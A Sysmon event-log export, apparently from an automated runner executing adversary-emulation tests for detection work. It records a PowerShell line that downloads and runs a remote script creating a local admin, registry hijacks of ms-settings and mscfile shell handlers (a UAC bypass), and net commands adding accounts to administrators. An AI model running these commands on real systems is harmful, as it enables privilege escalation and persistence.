"12/17/2025 8:02:27 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:27.821
ProcessGuid: {f995aebf-6393-6942-d105-000000000e00}
ProcessId: 10000
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe
ImageLoaded: C:\ProgramData\Microsoft\VisualStudio\Setup\x64\Microsoft.VisualStudio.Setup.Configuration.Native.dll
FileVersion: 3.12.2140.44225
Description: Configuration for Visual Studio Setup
Product: Visual Studio
Company: Microsoft Corporation
OriginalFileName: Microsoft.VisualStudio.Setup.Configuration.Native.dll
Hashes: SHA256=2D64E8F75E487211367CE99D49171695D9CDD47D855F27B920FCFFDE422F3A58
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:27 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:27.672
ProcessGuid: {f995aebf-6393-6942-cf05-000000000e00}
ProcessId: 9000
Image: C:\Windows\System32\conhost.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:27 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:27.670
ProcessGuid: {f995aebf-6393-6942-d005-000000000e00}
ProcessId: 7200
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\OpenConsole.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:27 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:02:27.398
ProcessGuid: {f995aebf-6393-6942-cc05-000000000e00}
ProcessId: 7396
Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\ms-settings\shell\open\command\DelegateExecute
Details: (Empty)
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:27 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:02:27.380
ProcessGuid: {f995aebf-6393-6942-cb05-000000000e00}
ProcessId: 5992
Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\ms-settings\shell\open\command\(Default)
Details: C:\Windows\System32\cmd.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:27 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:27.255
ProcessGuid: {f995aebf-6393-6942-c805-000000000e00}
ProcessId: 8200
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe
ImageLoaded: C:\ProgramData\Microsoft\VisualStudio\Setup\x64\Microsoft.VisualStudio.Setup.Configuration.Native.dll
FileVersion: 3.12.2140.44225
Description: Configuration for Visual Studio Setup
Product: Visual Studio
Company: Microsoft Corporation
OriginalFileName: Microsoft.VisualStudio.Setup.Configuration.Native.dll
Hashes: SHA256=2D64E8F75E487211367CE99D49171695D9CDD47D855F27B920FCFFDE422F3A58
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:27 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:27.103
ProcessGuid: {f995aebf-6393-6942-c605-000000000e00}
ProcessId: 1728
Image: C:\Windows\System32\conhost.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:27 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:27.101
ProcessGuid: {f995aebf-6393-6942-c705-000000000e00}
ProcessId: 10152
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\OpenConsole.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:26 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:02:26.995
ProcessGuid: {f995aebf-6392-6942-c305-000000000e00}
ProcessId: 7848
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\mscfile\shell\open\command\(Default)
Details: C:\Windows\System32\cmd.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:26 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:26.692
ProcessGuid: {f995aebf-6392-6942-c305-000000000e00}
ProcessId: 7848
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_h14oh0i5.bez.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:26 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:02:26.295
ProcessGuid: {f995aebf-6392-6942-c005-000000000e00}
ProcessId: 5344
Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\mscfile\shell\open\command\(Default)
Details: C:\Windows\System32\cmd.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:25 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:25.999
ProcessGuid: {f995aebf-6391-6942-bd05-000000000e00}
ProcessId: 8816
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:25 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:25.981
ProcessGuid: {f995aebf-6391-6942-bc05-000000000e00}
ProcessId: 6160
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:24 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:24.550
ProcessGuid: {f995aebf-6390-6942-ba05-000000000e00}
ProcessId: 4824
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_g5xblvca.30p.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:24 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:24.253
ProcessGuid: {f995aebf-6390-6942-b905-000000000e00}
ProcessId: 2456
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:24 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:24.243
ProcessGuid: {f995aebf-6390-6942-b905-000000000e00}
ProcessId: 2456
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1  user /del ""T1136.001_Admin"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8489DB35375D890314EB8F7CD9E0CBD3866475F4E252865F00F649B0A02FD757
ParentProcessGuid: {f995aebf-6390-6942-b805-000000000e00}
ParentProcessId: 8556
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: net  user /del ""T1136.001_Admin"" 
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:24 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:24.234
ProcessGuid: {f995aebf-6390-6942-b805-000000000e00}
ProcessId: 8556
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  user /del ""T1136.001_Admin"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777
ParentProcessGuid: {f995aebf-6390-6942-b605-000000000e00}
ParentProcessId: 7852
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c net user /del ""T1136.001_Admin"" >nul 2>&1
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:24 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:24.211
ProcessGuid: {f995aebf-6390-6942-b605-000000000e00}
ProcessId: 7852
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c net user /del ""T1136.001_Admin"" >nul 2>&1
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:23 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:23.793
ProcessGuid: {f995aebf-638f-6942-b405-000000000e00}
ProcessId: 3532
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_3q3ndica.zeo.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:23 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:23.503
ProcessGuid: {f995aebf-638f-6942-b305-000000000e00}
ProcessId: 5300
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:23 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:23.493
ProcessGuid: {f995aebf-638f-6942-b305-000000000e00}
ProcessId: 5300
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1  user /del ""T1136.001_CMD"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8489DB35375D890314EB8F7CD9E0CBD3866475F4E252865F00F649B0A02FD757
ParentProcessGuid: {f995aebf-638f-6942-b205-000000000e00}
ParentProcessId: 7196
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: net  user /del ""T1136.001_CMD"" 
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:23 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:23.484
ProcessGuid: {f995aebf-638f-6942-b205-000000000e00}
ProcessId: 7196
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  user /del ""T1136.001_CMD"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777
ParentProcessGuid: {f995aebf-638f-6942-b005-000000000e00}
ParentProcessId: 4940
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c net user /del ""T1136.001_CMD"" >nul 2>&1
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:23 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:23.459
ProcessGuid: {f995aebf-638f-6942-b005-000000000e00}
ProcessId: 4940
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c net user /del ""T1136.001_CMD"" >nul 2>&1
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:23 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:23.261
ProcessGuid: {f995aebf-638f-6942-af05-000000000e00}
ProcessId: 9880
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:23 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:23.241
ProcessGuid: {f995aebf-638f-6942-ae05-000000000e00}
ProcessId: 3296
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:16 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:02:15.770
ProcessGuid: {f995aebf-6387-6942-aa05-000000000e00}
ProcessId: 8068
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52182
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:02:16 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:16.031
ProcessGuid: {f995aebf-6387-6942-aa05-000000000e00}
ProcessId: 8068
QueryName: _ldap._tcp.dc._msdcs.WORKGROUP
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:16 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:15.849
ProcessGuid: {f995aebf-6387-6942-aa05-000000000e00}
ProcessId: 8068
QueryName: _ldap._tcp.dc._msdcs.runnervm8j6r3
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:16 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:15.765
ProcessGuid: {f995aebf-6387-6942-aa05-000000000e00}
ProcessId: 8068
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:16 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:16.017
ProcessGuid: {f995aebf-6388-6942-ad05-000000000e00}
ProcessId: 8980
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:16 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:16.009
ProcessGuid: {f995aebf-6388-6942-ad05-000000000e00}
ProcessId: 8980
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1 user NewLocalUser
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8489DB35375D890314EB8F7CD9E0CBD3866475F4E252865F00F649B0A02FD757
ParentProcessGuid: {f995aebf-6387-6942-ac05-000000000e00}
ParentProcessId: 3640
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: ""C:\Windows\system32\net.exe"" user NewLocalUser
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:15 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:15.999
ProcessGuid: {f995aebf-6387-6942-ac05-000000000e00}
ProcessId: 3640
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: ""C:\Windows\system32\net.exe"" user NewLocalUser
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777
ParentProcessGuid: {f995aebf-6387-6942-aa05-000000000e00}
ParentProcessId: 8068
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')}
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:15 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:02:15.777
ProcessGuid: {f995aebf-6387-6942-aa05-000000000e00}
ProcessId: 8068
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:15.548
ProcessGuid: {f995aebf-6387-6942-aa05-000000000e00}
ProcessId: 8068
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_zryrio23.jnx.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:15 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:15.446
ProcessGuid: {f995aebf-6387-6942-aa05-000000000e00}
ProcessId: 8068
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:15 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:15.205
ProcessGuid: {f995aebf-6387-6942-a905-000000000e00}
ProcessId: 972
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:15 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:15.195
ProcessGuid: {f995aebf-6387-6942-a905-000000000e00}
ProcessId: 972
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1  localgroup administrators ""T1136.001_Admin"" /add
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
